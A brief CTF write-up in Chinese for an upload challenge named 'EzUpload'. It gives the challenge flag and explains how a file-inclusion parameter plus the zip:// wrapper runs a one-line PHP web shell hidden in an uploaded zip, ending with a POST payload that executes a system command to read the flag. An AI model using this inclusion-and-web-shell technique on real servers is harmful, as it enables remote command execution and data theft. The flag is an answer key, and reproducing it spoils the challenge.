## EzUpload

让我看看你藏了什么好东西，快传上来吧。


`tjctf{Ju57_@_s1mpl3_Up104D}`

### writeup 

简单的文件上传

一个上传页面，有上传限制，但是能上传zip，于是想到zip协议。

`/index.php?url=xxx` 存在文件包含，那就打包上传一个带有一句话木马的zip文件，根据得到的路径包含即可。

payload:

```
POST http://ip:port/index.php?url=zip:///var/www/html/upload/e860448d9b20dab73195236d19267a62.zip%231

meow=system('cat /flag');
```

